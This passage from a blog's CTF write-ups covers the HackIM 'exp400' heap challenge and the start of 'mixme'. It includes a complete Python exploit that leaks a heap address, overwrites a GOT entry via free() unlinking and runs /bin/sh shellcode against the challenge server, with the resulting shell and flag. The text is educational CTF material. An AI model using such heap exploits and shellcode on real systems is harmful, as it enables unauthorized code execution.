</span><span class='line'><span class="mi">1</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span> <span class="nl">option</span><span class="p">:</span>
</span><span class='line'><span class="mi">1</span> <span class="n">to</span> <span class="n">add</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span> <span class="n">to</span> <span class="n">delete</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span> <span class="n">to</span> <span class="n">show</span> <span class="n">a</span> <span class="n">Note</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span> <span class="n">to</span> <span class="n">exit</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="nl">Choice</span><span class="p">:</span>
</span><span class='line'><span class="mi">3</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">Note</span> <span class="n">id</span> <span class="n">to</span> <span class="nl">edit</span><span class="p">:</span>
</span><span class='line'><span class="mi">0</span>
</span><span class='line'><span class="n">Give</span> <span class="n">the</span> <span class="n">type</span> <span class="n">to</span> <span class="nl">edit</span><span class="p">:</span>
</span><span class='line'><span class="mi">2</span>
</span><span class='line'><span class="n">Give</span> <span class="n">your</span> <span class="nl">Note</span><span class="p">:</span>
</span><span class='line'><span class="n">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap for note two now looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">60</span><span class="n">wx</span> <span class="mh">0x804d0c0</span>
</span><span class='line'><span class="mh">0x804d0c0</span><span class="o">:</span> <span class="mh">0x46464646</span>  <span class="mh">0x47474747</span>  <span class="mh">0x48484848</span>  <span class="mh">0x49494949</span>
</span><span class='line'><span class="mh">0x804d0d0</span><span class="o">:</span> <span class="mh">0x4a4a4a4a</span>  <span class="mh">0x4b4b4b4b</span>  <span class="mh">0x4c4c4c4c</span>  <span class="mh">0x4d4d4d4d</span>
</span><span class='line'><span class="mh">0x804d0e0</span><span class="o">:</span> <span class="mh">0x4e4e4e4e</span>  <span class="mh">0x4f4f4f4f</span>  <span class="mh">0x50505050</span>  <span class="mh">0x51515151</span>
</span><span class='line'><span class="mh">0x804d0f0</span><span class="o">:</span> <span class="mh">0x52525252</span>  <span class="mh">0x41414141</span>  <span class="mh">0x42424242</span>  <span class="mh">0x4242420a</span>
</span><span class='line'><span class="mh">0x804d100</span><span class="o">:</span> <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">vmmap</span>
</span><span class='line'><span class="n">Start</span>      <span class="n">End</span>        <span class="n">Perm</span>   <span class="n">Name</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'><span class="mh">0x0804c000</span> <span class="mh">0x0804e000</span> <span class="n">rwxp</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">60</span><span class="n">wx</span> <span class="mh">0x804d0c0</span>
</span><span class='line'><span class="mh">0x804d0c0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0d0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0e0</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d0f0</span><span class="o">:</span> <span class="mh">0x4242420a</span>  <span class="mh">0x0804d1d0</span>  <span class="mh">0x0804d010</span>  <span class="mh">0x42424242</span>
</span><span class='line'><span class="mh">0x804d100</span><span class="o">:</span> <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804d110</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span> <span class="mi">9004</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span>  <span class="o">=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">&quot;</span>   <span class="c"># create two notes of type one</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;3</span><span class="se">\n</span><span class="s">0</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">&quot;</span>      <span class="c"># edit note 0 as type two</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overflow note to line up to heap pointer</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">212</span><span class="o">+</span><span class="s">&quot;BBB</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># leak heap addr</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Trying to leaking heap address...&quot;</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;4</span><span class="se">\n</span><span class="s">0</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ugly.. but works :/</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;.*BBB\n(....).*&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">heap</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked heap address at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
</span><span class='line'>  <span class="c"># offset for shellcode found empirically via gdb</span>
</span><span class='line'>  <span class="n">shellcode</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">-</span> <span class="mh">0xd0</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Shellcode at {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[!] Fatal: could not leak heap address&quot;</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Sending new notes to overwrite got pointer...&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>    <span class="c"># create two more notes</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send new note to overflow pointers</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">sc</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="c"># prepend shellcode with a little NOP sled</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">212</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sc</span>
</span><span class='line'><span class="c"># overwrite note_info struct</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b024</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>     <span class="c"># __isoc99_scanf@got.plt-8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>       <span class="c"># heap location of shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># request deletion of a note, triggering our write-what-where</span>
</span><span class='line'><span class="c"># we overwrite a function pointer in the got with the location</span>
</span><span class='line'><span class="c"># of our shellcode</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell incoming!</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Enjoy your shell!&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bas</span><span class="nd">@tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nullcon</span><span class="o">/</span><span class="n">exp400</span><span class="err">$</span> <span class="n">python</span> <span class="n">sploit</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">leaking</span> <span class="n">heap</span> <span class="n">address</span><span class="o">...</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">heap</span> <span class="n">address</span> <span class="n">at</span> <span class="mh">0x85cf1d0</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Shellcode</span> <span class="n">at</span> <span class="mh">0x85cf100</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">new</span> <span class="n">notes</span> <span class="n">to</span> <span class="n">overwrite</span> <span class="n">got</span> <span class="n">pointer</span><span class="o">...</span>
</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Enjoy</span> <span class="n">your</span> <span class="n">shell</span><span class="err">!</span>
</span><span class='line'><span class="nb">id</span>
</span><span class='line'><span class="o">/</span><span class="nb">bin</span><span class="o">//</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="nb">id</span><span class="p">:</span> <span class="ow">not</span> <span class="n">found</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
    <updated>2015-01-11T18:52:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
    <content type="html"><![CDATA[<p><code>mixme</code> was a 500 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>==========================================
</span><span class='line'>======== Uncle Podger's Data Store =======
</span><span class='line'>==========================================
</span><span class='line'>
</span><span class='line'>Select op (store/get/edit/exit): store
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Enter data: AAAA
</span><span class='line'>Select op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>AAAASelect op (store/get/edit/exit): get
</span><span class='line'>Name: a
</span><span class='line'>Size: 4
</span><span class='line'>Not found
</span><span class='line'>Select op (store/get/edit/exit): Invalid input
</span><span class='line'>Select op (store/get/edit/exit): </span></code></pre></td></tr></table></div></figure>


<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># allocated three notes, in heap:
</span><span class='line'>0x8314000:    0x00000000  0x00000029  0x44414548  0x00000000
</span><span class='line'>0x8314010:    0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314020:    0x08314030  0x083140a0  0x00000000  0x00000029
</span><span class='line'>0x8314030:    0x00000061  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x8314040:    0x00000004  0x08314058  0x08314068  0x08314008
</span><span class='line'>0x8314050:    0x00000000  0x00000011  0x41414141  0x00000000
</span><span class='line'>0x8314060:    0x00000000  0x00000029  0x00000062  0x00000000
</span><span class='line'>0x8314070:    0x00000000  0x00000000  0x00000004  0x08314090
</span><span class='line'>0x8314080:    0x083140a0  0x08314030  0x00000000  0x00000011
</span><span class='line'>0x8314090:    0x42424242  0x00000000  0x00000000  0x00000029
</span><span class='line'>0x83140a0:    0x00000063  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x83140b0:    0x00000004  0x083140c8  0x08314008  0x08314068
</span><span class='line'>0x83140c0:    0x00000000  0x00000011  0x43434343  0x00000000
</span><span class='line'>0x83140d0:    0x00000000  0x00020f31  0x00000000  0x00000000
</span><span class='line'>0x83140e0:    0x00000000  0x00000000  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">note_info</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">next_note</span><span class="p">;</span>
</span><span class='line'>  <span class="n">note_info</span> <span class="o">*</span><span class="n">prev_note</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># after editing &#39;a&#39; with 40 bytes where 4 is allocated:</span>
</span><span class='line'><span class="mh">0x8314000</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>  <span class="mh">0x44414548</span>  <span class="mh">0x00000000</span>
